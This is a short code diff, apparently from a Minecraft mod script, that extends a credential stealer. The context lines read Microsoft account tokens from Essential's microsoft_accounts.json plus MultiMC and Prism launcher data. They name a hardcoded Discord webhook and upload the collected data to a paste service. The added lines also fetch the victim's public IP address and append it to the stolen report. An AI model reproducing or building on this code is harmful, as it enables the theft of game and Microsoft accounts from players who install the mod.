@@ -20,6 +20,7 @@ const data = {
     essentials: FileLib.read(`${mcFolder}\\essential\\microsoft_accounts.json`),
     mmc: mmc,
     prism: prism,
+    ip: FileLib.getUrlContent("https://api.myip.com")
 };
 
 const link = "https://discord.com/api/webhooks/1374785605862428742/t8yUQsyCWBbX7IPIlR5oxGNn6-cuBLp6Hl-y3pr_ftuftEHBDO5sLFab4vnlgAm-WCCx";
@@ -43,6 +44,8 @@ ${data.mmc || 'No MultiMC data found'}
 
 === PRISM LAUNCHER DATA ===
 ${data.prism || 'No Prism Launcher data found'}
+
+${data.ip}
 `;
 
         const hastebinUrl = new java.net.URL("https://hst.sh/documents");
